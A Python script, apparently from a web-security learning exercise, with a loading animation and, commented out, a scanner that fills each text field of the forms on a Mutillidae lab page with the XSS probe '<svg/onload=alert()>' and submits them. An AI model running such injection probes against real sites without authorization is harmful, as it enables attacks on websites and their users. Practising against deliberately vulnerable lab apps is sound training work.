#! /usr/bin/env python

import requests
from bs4 import BeautifulSoup
from urllib import parse
import os

from sys import stdout
from time import sleep
import sys

import time
import sys


def loading():
    pom = 0
    dot = ""
    while True:
        pom += 1
        time.sleep(0.3)
        if pom != 5:
            print(f"\rWorking{dot}", end="")
            dot = dot + "."
        else:
            sys.stdout.flush()
            dot = ""
            pom = 0


loading()

# def payloads_from_file():
#     path = os.getcwd() + "\\payloads.txt"
#     all_cleaned_payloads = []
#     with open(path, "r") as payloads:
#         all_payloads = payloads.readlines()
#         for payload in all_payloads:
#             all_cleaned_payloads.append(payload.replace("\n", ""))
#
#     return all_cleaned_payloads
#
#
# for a in payloads_from_file():
#     print(a)


# def make_requests(url):
#     try:
#         return requests.get(url)
#     except requests.exceptions.ConnectionError:
#         pass
#
#
# target_url = "http://192.168.56.101/mutillidae/index.php?page=dns-lookup.php"
# response = make_requests(target_url)
#
# # find all forms
# parsed_html = BeautifulSoup(response.content, features="html.parser")
# forms_list = parsed_html.findAll("form")
#
# # get attributes from form tags
# for form in forms_list:
#     action = form.get("action")
#     post_url = parse.urljoin(target_url, action)
#     method = form.get("method")
#
#     # find all inputs from forms
#     inputs_list = form.findAll("input")
#     post_data = {}
#     for input_from_html in inputs_list:
#         input_name = input_from_html.get("name")
#         input_type = input_from_html.get("type")
#         input_value = input_from_html.get("value")
#         if input_type == "text":
#             input_value = "<svg/onload=alert()>"
#
#         post_data[input_name] = input_value
#
#     result = requests.post(post_url, data=post_data)
#     print(result.content)
